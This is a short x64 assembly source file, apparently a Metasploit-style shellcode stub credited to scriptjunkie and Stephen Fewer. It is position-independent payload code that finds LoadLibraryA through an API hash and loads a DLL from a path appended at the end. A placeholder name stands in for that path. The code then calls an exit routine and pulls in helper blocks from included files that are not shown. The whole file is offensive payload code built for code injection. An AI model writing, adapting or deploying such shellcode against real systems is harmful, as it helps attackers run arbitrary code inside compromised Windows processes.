;-----------------------------------------------------------------------------;
; Author: scriptjunkie (scriptjunkie[at]scriptjunkie[dot]us),
;    Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2003
; 17 Jan 2012
;-----------------------------------------------------------------------------;

[BITS 64]
[ORG 0]

  cld                    ; Clear the direction flag.
  and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
%include "./src/block/block_api.asm" ; 
start:                   ;
  pop rbp                ; Pop off the address of 'api_call' for calling later.
  lea rcx, [rbp+libpath-delta]
  mov r10d, 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call rbp               ; LoadLibraryA( &libpath );
	; Finish up with the EXITFUNK.
%include "./src/block/block_exitfunk.asm"
libpath:
  ;db "funkystuff.dll", 0
